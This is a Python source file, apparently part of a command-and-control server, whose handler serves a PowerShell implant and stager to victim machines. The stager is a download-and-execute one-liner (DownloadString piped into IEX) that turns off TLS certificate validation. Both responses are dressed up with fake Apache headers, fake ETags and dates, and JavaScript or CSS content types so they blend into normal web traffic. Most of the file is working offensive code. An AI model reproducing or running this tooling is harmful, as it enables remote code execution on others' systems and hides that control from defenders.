from handlers.base_handler import BaseHandler
from utils.agent_generator import generate_agent_code, generate_pwsh_base64_str

class AgentHandler(BaseHandler):
    """Handler for agent code delivery requests"""
    
    def handle_agent_request(self):
        """Send PowerShell agent code to client"""
        # Get the server address
        server_address = f"{self.server.server_address[0]}:{self.server.server_address[1]}"
        
        # Get current paths and rotation info
        current_paths = self.path_router.get_current_paths()
        rotation_info = self.path_router.get_rotation_info()
        
        # Get agent configuration from server if available
        agent_config = getattr(self.server, 'agent_config', None)
        
        # Generate the agent code with path pool only approach
        agent_code = generate_agent_code(
            server_address=server_address, 
            # No need for dedicated paths anymore
            beacon_path=None,
            cmd_result_path=None,
            rotation_info=rotation_info,
            agent_config=agent_config
        )

        # Send response with additional headers to look like a real web server
        headers = {
            "Cache-Control": "max-age=3600, must-revalidate",
            "Server": "Apache/2.4.41 (Ubuntu)",
            "Content-Type": "text/javascript", # More realistic for web resources
            "ETag": "\"3f8-6017f1bc12b42\"", # Fake ETag for realism
            "Last-Modified": "Tue, 28 Jan 2025 15:23:47 GMT" # Fake last-modified date
        }
        self.send_response(200, "text/javascript", agent_code, headers)
        self.log_message(f"Served agent code to {self.client_address[0]} (size: {len(agent_code)} bytes)")
        
    def handle_stager_request(self):
        """Send Base64 encoded stager to client"""
        # Get server address components
        server_ip = self.server.server_address[0]
        server_port = self.server.server_address[1]
        server_address = f"{server_ip}:{server_port}"
        
        # Check if SSL is enabled
        use_ssl = hasattr(self.server, 'ssl_context') and self.server.ssl_context is not None
        
        # Get a random path from the pool for agent download
        random_path = self.path_router.get_random_path()
        
        # Add a mundane query parameter to help with routing 
        # 'r=1' indicates agent request (resource parameter)
        if '?' in random_path:
            random_path += '&r=1'
        else:
            random_path += '?r=1'
        
        # Create the stager code - this will download from a path tagged as agent resource
        protocol = "https" if use_ssl else "http"
        stager_code = f"$V=new-object net.webclient;$S=$V.DownloadString('{protocol}://{server_address}{random_path}');IEX($S)"
        
        # Add SSL certificate validation bypass if using SSL
        if use_ssl:
            stager_code = (
                "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;\n"
                "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};\n"
                f"{stager_code}"
            )
        
        # Log the stager request and path
        self.log_message(f"Serving stager code to {self.client_address[0]} using path: {random_path}")
        
        # Send response with additional headers to make it look like CSS content
        headers = {
            "Cache-Control": "max-age=3600, must-revalidate",
            "Server": "Apache/2.4.41 (Ubuntu)",
            "Content-Type": "text/css", # More realistic for stager
            "ETag": "\"2c7-af609fb8b73c0\"", # Fake ETag for realism
            "Last-Modified": "Mon, 17 Feb 2025 10:19:22 GMT" # Fake last-modified date
        }
        self.send_response(200, "text/css", stager_code, headers)